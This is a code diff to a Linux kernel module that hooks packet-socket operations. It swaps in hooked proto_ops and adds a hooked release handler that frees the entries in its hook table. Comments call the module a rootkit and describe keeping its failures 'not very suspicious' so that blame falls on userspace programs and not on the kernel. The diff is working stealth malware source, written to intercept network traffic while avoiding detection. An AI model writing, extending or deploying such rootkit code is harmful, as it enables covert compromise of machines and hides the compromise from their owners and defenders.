@@ -11,15 +11,17 @@
 
 struct hooked_socket_entry {
     struct hlist_node node;
+    struct hlist_node prot_hook_node;
     struct socket *sock;
     const struct proto_ops *original_packet_ops;
     int (*original_packet_rcv)(struct sk_buff *skb, struct net_device *dev,
 		                       struct packet_type *pt, struct net_device *orig_dev);
 };
 
-void hook_packet_sock(struct socket *sock);
 struct hooked_socket_entry *get_socket_hook(struct socket *sock);
 struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt);
+void hook_packet_sock(struct socket *sock);
+int release_socket_hook(struct socket *sock);
 
 static DEFINE_SPINLOCK(hook_packet_lock);
 
@@ -40,6 +42,23 @@ static int hooked_packet_setsockopt(struct socket *sock, int level, int optname,
     spin_lock_irqsave(&hook_packet_lock, _flags);
     hook_packet_sock(sock);
 	spin_unlock_irqrestore(&hook_packet_lock, _flags);
+    return result;
+}
+
+
+static int hooked_packet_release(struct socket *sock)
+{
+    int result;
+    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
+
+    // This case shouldn't happen, but if it does, the userspace program is likely to break.
+    // Returning 0 means the syscall will not be very suspicious without heavy debugging, 
+    // the immidiete suspect will be the userspace program, instead of the kernel.
+    // TODO: Add a panic method that will remove the rootkit if this happends.
+    if (!sock_hook) return 0;
+
+    result = sock_hook->original_packet_ops->release(sock);
+    release_socket_hook(sock);
     return result;
 }
 
@@ -77,13 +96,12 @@ struct hooked_socket_entry *get_socket_hook(struct socket *sock) {
 struct hooked_socket_entry *get_socket_hook_by_prot_hook(struct packet_type *pt) {
     struct hooked_socket_entry *sock_hook;
 
-    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, node, (uintptr_t)pt) {
+    hash_for_each_possible(hooked_sockets_by_prot_hook, sock_hook, prot_hook_node, (uintptr_t)pt) {
         if (&pkt_sk(sock_hook->sock->sk)->prot_hook == pt) return sock_hook;
     }
     return 0;
 }
 
-// TODO: Free the socket hook on socket release.
 // TODO: split the generic socket hook into a seperate file.
 
 struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struct proto_ops **hooked_ops) {
@@ -105,9 +123,26 @@ struct hooked_socket_entry *get_or_create_socket_hook(struct socket *sock, struc
     memcpy(*hooked_ops, sock_hook->original_packet_ops, sizeof(struct proto_ops));
     sock->ops = *hooked_ops;
 
+    (*hooked_ops)->release = hooked_packet_release;
+
     hash_add(hooked_sockets, &sock_hook->node, (uintptr_t)sock);
-    hash_add(hooked_sockets_by_prot_hook, &sock_hook->node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
+    hash_add(hooked_sockets_by_prot_hook, &sock_hook->prot_hook_node, (uintptr_t)(&pkt_sk(sock->sk)->prot_hook));
     return sock_hook;
+}
+
+int release_socket_hook(struct socket *sock) {
+    struct hooked_socket_entry *sock_hook = get_socket_hook(sock);
+
+    if (!sock_hook)  {
+        // TODO: panic.
+        return -1;
+    }
+
+    hash_del(&sock_hook->node);
+    hash_del(&sock_hook->prot_hook_node);
+    kfree(sock_hook);
+    return 0;
+
 }
 
 void hook_packet_sock(struct socket *sock) {
